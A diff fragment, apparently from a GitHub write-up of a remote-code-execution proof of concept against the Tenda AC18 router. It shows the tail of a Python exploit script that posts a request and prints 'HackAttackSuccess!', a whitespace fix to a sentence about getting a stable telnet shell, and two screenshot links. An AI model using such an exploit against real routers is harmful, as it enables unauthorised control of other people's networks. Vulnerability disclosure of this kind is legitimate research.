@@ -36,6 +36,6 @@ response = requests.post(url, cookies=cookie, data=data)
 print(response.text)
 print("HackAttackSuccess!")
 ```
-Use the above POC to play shell through telnetYou can get a very stable shell
+Use the above POC to play shell through telnet You can get a very stable shell
 ![rce1.3.png](https://github.com/wshidamowang/Router/blob/main/Tenda/AC18/AC18_images/rce1.3.png)
 ![rce1.4.png](https://github.com/wshidamowang/Router/blob/main/Tenda/AC18/AC18_images/rce1.3.png)
